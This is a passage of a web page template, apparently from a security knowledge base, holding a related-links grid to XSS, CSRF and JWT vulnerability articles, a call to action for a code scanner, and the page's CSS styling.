					<div class="faq-item">
						<h3>{faq.question}</h3>
						<p>{faq.answer}</p>
					</div>
				{/each}
			</div>
		</section>

		<!-- Related -->
		<section class="article-section">
			<h2>Related content</h2>

			<div class="related-grid">
				<a href="/kb/security/vulnerabilities/xss/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">Cross-Site Scripting (XSS)</div>
					<p class="related-card-description">Session hijacking depends on XSS to steal tokens from localStorage</p>
				</a>
				<a href="/kb/security/vulnerabilities/csrf/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">Cross-Site Request Forgery (CSRF)</div>
					<p class="related-card-description">Session-based attacks that bypass authentication checks</p>
				</a>
				<a href="/kb/security/vulnerabilities/jwt-vulnerabilities/" class="card card-interactive related-card">
					<div class="related-card-category">Vulnerability</div>
					<div class="related-card-title">JWT Vulnerabilities</div>
					<p class="related-card-description">Token-based authentication weaknesses and exploits</p>
				</a>
				<a href="/kb/security/" class="card card-interactive related-card">
					<div class="related-card-category">Security Hub</div>
					<div class="related-card-title">Security Vulnerabilities Overview</div>
					<p class="related-card-description">Complete guide to common security vulnerabilities in vibe coded apps</p>
				</a>
			</div>
		</section>

		<!-- Final CTA -->
		<div class="final-cta">
			<h2>Find auth vulnerabilities before attackers do</h2>
			<p>Account takeover happens when authentication assumptions fail under adversarial pressure.</p>
			<a href="https://scanner.vibeship.co" class="btn btn-green btn-lg">
				Scan your code now
				<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
					<path d="M5 12h14M12 5l7 7-7 7"/>
				</svg>
			</a>
		</div>
	</article>
</div>

<style>
	/* Badge row */
	.badge-row {
		display: flex;
		gap: 0.5rem;
		margin-bottom: 1rem;
		flex-wrap: wrap;
	}

	/* Data Source Attribution */
	.data-source {
		font-size: 0.75rem;
		color: var(--text-tertiary);
		margin: 0.5rem 0 1.5rem;
	}

	.data-source a {
		color: var(--text-secondary);
	}

	/* Pattern Detail Sections */
	.pattern-detail {
		margin: 2.5rem 0;
		padding-top: 1.5rem;
		border-top: 1px solid var(--border);
	}

	.pattern-detail:first-of-type {
		border-top: none;
		padding-top: 0;
	}

	.pattern-detail h3 {
		margin-bottom: 0.75rem;
		color: var(--text-primary);
	}

	.pattern-detail p {
		margin-bottom: 1rem;
	}

	.pattern-detail ul {
		margin: 1rem 0;
		padding-left: 1.5rem;
	}

	.pattern-detail li {
		margin-bottom: 0.5rem;
		color: var(--text-secondary);
		line-height: 1.6;
	}

	/* Code blocks in patterns */
	.code-block.vulnerable {
		border-left: 3px solid var(--red);
		margin-bottom: 1rem;
	}

	.code-block.secure {
		border-left: 3px solid var(--green);
		margin-bottom: 1.5rem;
	}

	/* Detection sections now use global .alert and .cta-box */

	/* Prevention Matrix */
	.prevention-matrix {
		font-size: 0.8rem;
	}

	.prevention-matrix th {
		font-size: 0.65rem;
	}

	.prevention-matrix td {
		text-align: center;
	}

	.prevention-matrix td:first-child {
		text-align: left;
		font-weight: 500;
	}

	.prevention-matrix .blocks {
		color: var(--green);
		font-weight: 600;
	}

	.prevention-matrix .partial {
		color: var(--orange);
	}

	.matrix-note {
		font-size: 0.8rem;
		color: var(--text-tertiary);
		margin-top: 0.5rem;
	}

	/* Stats row */
	.stats-row {
		display: grid;
		grid-template-columns: repeat(4, 1fr);
		gap: 1rem;
		margin: 1.5rem 0;
	}

	/* Responsive */
	@media (max-width: 768px) {
		.stats-row {
			grid-template-columns: repeat(2, 1fr);
		}

		.prevention-matrix {
			font-size: 0.7rem;
		}

		.prevention-matrix th,
		.prevention-matrix td {
			padding: 0.5rem 0.25rem;
		}
	}
</style>
